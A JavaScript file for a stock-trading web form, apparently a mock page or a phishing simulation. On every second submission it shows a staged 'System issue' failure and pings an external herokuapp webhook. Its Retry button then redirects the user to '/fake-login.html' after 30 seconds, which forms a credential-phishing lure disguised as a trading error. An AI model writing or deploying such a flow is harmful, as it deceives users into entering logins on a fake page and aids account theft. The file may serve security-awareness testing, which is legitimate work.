// Placeholder for script.js content
// Integrate dynamically as needed based on user inputs and requirements

document.addEventListener('DOMContentLoaded', () => {
    console.log('Canvas for script.js dynamically loaded and ready.');

    // Stock prices for validation
    const currentStockPrices = {
        'AAPL': 150.00,
        'GOOGL': 2800.00,
        'AMZN': 3500.00,
        'TSLA': 700.00
    };

    let transactionAttempt = 0; // Track transaction attempts

    // Update dropdown to include current prices
    const stockDropdown = document.getElementById('stock');
    stockDropdown.innerHTML = Object.entries(currentStockPrices)
        .map(([symbol, price]) => `<option value="${symbol}">${symbol} ($${price.toFixed(2)})</option>`)
        .join('');

    // Existing transaction form functionality
    document.getElementById('transaction-form').addEventListener('submit', (event) => {
        event.preventDefault();

        // Get form values
        const stock = document.getElementById('stock').value;
        const quantity = parseInt(document.getElementById('quantity').value, 10);
        const price = parseFloat(document.getElementById('price').value);
        const transactionType = document.getElementById('transaction-type').value;
        const resultsDiv = document.getElementById('results');

        // Get the current price of the selected stock
        const currentPrice = currentStockPrices[stock];

        // Display initial processing message
        resultsDiv.innerHTML = `
            <p><strong>Processing Transaction...</strong></p>
            <p>Please wait while we complete your request.</p>
        `;
        resultsDiv.style.color = 'blue';

        if (transactionAttempt % 2 === 0) {
            // First attempt succeeds
            setTimeout(() => {
                resultsDiv.innerHTML = `
                    <p><strong>Transaction Successful!</strong></p>
                    <p>You ${transactionType === 'buy' ? 'bought' : 'sold'} ${quantity} shares of ${stock} at $${price.toFixed(2)} per share.</p>
                `;
                resultsDiv.style.color = 'green';
                transactionAttempt++;
            }, 4000);
        } else {
            // Second attempt fails and triggers event
            setTimeout(() => {
                resultsDiv.innerHTML = `
                    <p style="color: red; font-size: large;"><strong>Transaction Failed!</strong></p>
                    <p style="color: red; font-size: large;"><strong>Reason: System issue encountered.</strong></p>
                    <button id="retry-button">Retry</button>
                `;
                resultsDiv.style.color = 'red';
                transactionAttempt++;

                // Send webhook GET request
                fetch('https://event-sender.herokuapp.com/ondemand/142bbf85-ab16-4ec6-b485-674774104f6e', {
                    method: 'GET',
                })
                    .then(response => {
                        if (response.ok) {
                            console.log('Webhook sent successfully via GET request');
                        } else {
                            console.error('Failed to send webhook via GET request:', response.statusText);
                        }
                    })
                    .catch(error => {
                        console.error('Error sending webhook via GET request:', error);
                    });

                // Add retry functionality
                document.getElementById('retry-button').addEventListener('click', () => {
                    resultsDiv.innerHTML = `<p><strong>Retrying transaction... Please wait 30 seconds.</strong></p>`;
                    resultsDiv.style.color = 'blue';
                    setTimeout(() => {
                        window.location.href = '/fake-login.html';
                    }, 30000); // Redirect after 30 seconds
                });
            }, 4000);
        }
    });
});
